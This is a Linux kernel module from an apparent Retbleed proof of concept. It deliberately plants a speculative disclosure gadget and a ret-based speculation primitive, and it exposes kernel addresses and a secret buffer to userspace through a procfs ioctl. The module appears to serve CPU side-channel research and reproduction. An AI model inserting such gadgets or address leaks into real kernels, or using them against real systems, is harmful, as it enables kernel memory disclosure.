#include <linux/fs.h>
#include "linux/sysctl.h"
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <asm-generic/io.h> /* virt_to_phys */
#include <linux/random.h>
#include <linux/uaccess.h> /* copy_from_user, copy_to_user */
#include "./retbleed_poc_ioctl.h"


__attribute__((aligned(0x100)))
static unsigned char random_bytes[0x1000];

static struct proc_dir_entry *procfs_file;

/**
 * The most trivial kind of disclosure gadget. loads secret, shifts it, and uses
 * it as index in reload buffer.
 *
 * Note: This function is *never* architecturally executed. Only speculatively.
 */
void disclosure_gadget(u64 secret, u8 *reload_buffer);
asm(
	".align 0x800\n\t"
	"disclosure_gadget:\n\t"
    "mov (%rdi), %rdi\n\t"
    "and $0xff, %rdi\n\t"
	"shl $12, %rdi\n\t"
	"movq $2, (%rdi, %rsi)\n\t"
	"lfence\n\t");


static struct synth_gadget_desc desc = {};

void speculation_primitive_ret(void);
void speculation_primitive(unsigned long secret, unsigned long addr);
asm(
    ".align 0x800\n\t"
    "speculation_primitive: \n\t"
    "clflush (%rsp)\n\t"
    "speculation_primitive_ret: ret\n\t"
);

static long handle_ioctl(struct file *filp, unsigned int request, unsigned long argp) {
    struct payload p;
    if (request == REQ_GADGET) {
        asm volatile("lfence");
        if (copy_to_user((void *)argp, &desc, sizeof(struct synth_gadget_desc)) != 0) {
            return -EFAULT;
        }
    }
    if (request == REQ_SPECULATE) {
        asm volatile("lfence");
        if (copy_from_user(&p, (void *)argp, sizeof(struct payload)) != 0) {
            return -EFAULT;
        }
        speculation_primitive(p.secret, p.reload_buffer);
    }

    if (request == REQ_SECRET) {
        asm volatile("lfence");
        if (copy_to_user((void *)argp, random_bytes, sizeof(random_bytes)) != 0) {
            return -EFAULT;
        }
    }
    return 0;
}


static struct proc_ops pops = {
    .proc_ioctl = handle_ioctl,
    .proc_open = nonseekable_open,
    .proc_lseek = no_llseek,
};

static void mod_spectre_exit(void) {
    proc_remove(procfs_file);
}

static int mod_spectre_init(void) {
    desc.physmap_base = page_offset_base;
    desc.kbr_dst = ((u64)&disclosure_gadget);
    // last target before the ret.
    desc.last_tgt = (u64)&speculation_primitive;
    desc.kbr_src = (u64)&speculation_primitive_ret;

    prandom_bytes(random_bytes, 0x1000);

    // The first byte is hardcoded. This allows us to infer the BTB collision
    // patterns from which we create the indexing functions.
    random_bytes[0] = 6;

    // want to leak from here...
    desc.secret = (long)random_bytes;
    pr_info("physmap_base %lx\n", page_offset_base);
    pr_info("kbr_src      %lx\n", desc.kbr_src);
    pr_info("kbr_dst      %lx\n", desc.kbr_dst);
    pr_info("secret       %lx\n", desc.secret);
    pr_info("secret[0]    %x\n", *(u8 *)desc.secret);

    procfs_file = proc_create(PROC_RETBLEED_POC, 0, NULL, &pops);
    return 0;
}

module_init(mod_spectre_init);
module_exit(mod_spectre_exit);

MODULE_LICENSE("GPL");
